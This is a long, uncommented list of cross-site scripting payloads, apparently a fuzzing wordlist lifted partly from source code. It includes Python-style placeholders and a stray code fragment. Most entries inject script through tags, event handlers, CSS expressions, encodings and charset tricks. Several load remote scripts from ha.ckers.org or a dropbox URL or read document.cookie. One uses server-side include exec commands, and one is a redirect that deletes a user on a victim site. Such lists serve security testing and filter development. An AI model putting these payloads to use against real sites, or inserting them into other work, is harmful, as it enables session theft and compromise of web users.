1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
<x style="behavior:url(%(sct)s)">
<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
<event-source src="%(event)s" onload="javascript:alert(1)">
<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">
<script>%(payload)s</script>
<script src=%(jscript)s></script>
<script language='javascript' src='%(jscript)s'></script>
<script>javascript:alert(1)</script>
<IMG SRC="javascript:javascript:alert(1);">
<IMG SRC=javascript:javascript:alert(1)>
<IMG SRC=`javascript:javascript:alert(1)`>
<SCRIPT SRC=%(jscript)s?<B>
<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
<BODY ONLOAD=javascript:alert(1)>
<BODY ONLOAD=javascript:javascript:alert(1)>
<IMG SRC="jav	ascript:javascript:alert(1);">
<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
<SCRIPT/SRC="%(jscript)s"></SCRIPT>
<<SCRIPT>%(payload)s//<</SCRIPT>
<IMG SRC="javascript:javascript:alert(1)"
<iframe src=%(scriptlet)s <
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
<IMG DYNSRC="javascript:javascript:alert(1)">
<IMG LOWSRC="javascript:javascript:alert(1)">
<BGSOUND SRC="javascript:javascript:alert(1);">
<BR SIZE="&{javascript:alert(1)}">
<LAYER SRC="%(scriptlet)s"></LAYER>
<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
<STYLE>@import'%(css)s';</STYLE>
<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
<XSS STYLE="behavior: url(%(htc)s);">
<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
<TABLE BACKGROUND="javascript:javascript:alert(1)">
<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
<DIV STYLE="width:expression(javascript:alert(1));">
<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
<XSS STYLE="xss:expression(javascript:alert(1))">
<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
<BASE HREF="javascript:javascript:alert(1);//">
<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
<SCRIPT SRC="%(jpg)s"></SCRIPT>
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
<STYLE>@import'%(css)s';</STYLE>
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
<style onreadystatechange=javascript:javascript:alert(1);></style>
<?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
<embed code=%(scriptlet)s></embed>
<embed code=javascript:javascript:alert(1);></embed>
<embed src=%(jscript)s></embed>
<frameset onload=javascript:javascript:alert(1)></frameset>
<object onerror=javascript:javascript:alert(1)>
<embed type="image" src=%(scriptlet)s></embed>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>
<IMG SRC=&{javascript:alert(1);};>
<a href="jav&#65ascript:javascript:alert(1)">test1</a>
<a href="jav&#97ascript:javascript:alert(1)">test1</a>
<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<a onmouseover="alert(document.cookie)">xxs link</a>
<a onmouseover=alert(document.cookie)>xxs link</a>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<SCRIPT SRC=//ha.ckers.org/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="livescript:[code]">
<BODY ONLOAD=alert('XSS')>
xss"><!--><svg/onload=alert(document.domain)>
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<BASE HREF="javascript:alert('XSS');//">
 <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<A HREF="http://66.102.7.147/">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
<img/src=`%00` onerror=this.onerror=confirm(1) 
<form><isindex formaction="javascript&colon;confirm(1)"
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
http://www.google<script .com>alert(document.location)</script
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<script ^__^>alert(String.fromCharCode(49))</script ^__^
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
&#00;</form><input type&#61;"date" onfocus="alert(1)">
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<script ~~~>alert(0%0)</script ~~~>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<div/style="width:expression(confirm(1))">X</div> {IE7}
<iframe/%00/ src=javaSCRIPT&colon;alert(1)
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<var onmouseover="prompt(1)">On Mouse Over</var>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
http://www.<script>alert(1)</script .com
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<svg><script ?>alert(1)
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<math><a xlink:href="//jsfiddle.net/t846h/">click
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<img src ?itworksonchrome?\/onerror = alert(1)
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href="//jsfiddle.net/t846h/">click
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>%3Cimg/src=%3Dx+onload=alert(2)%3D
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%48%69%22%29%3b%3c%2f%73%63%72%69%70%74%3e
'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(0x0000EB)%3C/script%3E 
48e71%3balert(1)//503466e3
';confirm('XSS')//1491b2as
a29b1%3balert(888)//a62b7156d82
<scr&#x9ipt>alert('XSS')</scr&#x9ipt>
"onmouseover%3dprompt(941634) 
%f6%22%20onmouseover%3dprompt(941634)%20
" onerror=alert()1 a="
style=xss:expression(alert(1))
<input type=text value=“XSS”>
	A” autofocus onfocus=alert(“XSS”)//
<input type=text value=”A” autofocus onfocus=alert(“XSS”)//”>	
<a href="javascript:alert(1)">ssss</a>
+ADw-p+AD4-Welcome to UTF-7!+ADw-+AC8-p+AD4-
+ADw-script+AD4-alert(+ACc-utf-7!+ACc-)+ADw-+AC8-script+AD4-
+ADw-script+AD4-alert(+ACc-xss+ACc-)+ADw-+AC8-script+AD4-
<%00script>alert(‘XSS’)<%00/script>
<%script>alert(‘XSS’)<%/script>
<%tag style=”xss:expression(alert(‘XSS’))”>
<%tag    onmouseover="(alert('XSS'))"> is invalid. <%br />
</b style="expr/**/ession(alert('vulnerable'))">
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
<SCRIPT SRC=//ha.ckers.org/.j>
<iframe src=http://ha.ckers.org/scriptlet.html <
<IMG SRC="javascript:alert('XSS')"
<SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>
\";alert('XSS');//
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<XSS STYLE="behavior: url(xss.htc);">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
<IMG SRC='vbscript:msgbox("XSS")'>
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<XSS STYLE="xss:expression(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
<BASE HREF="javascript:alert('XSS');//">
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
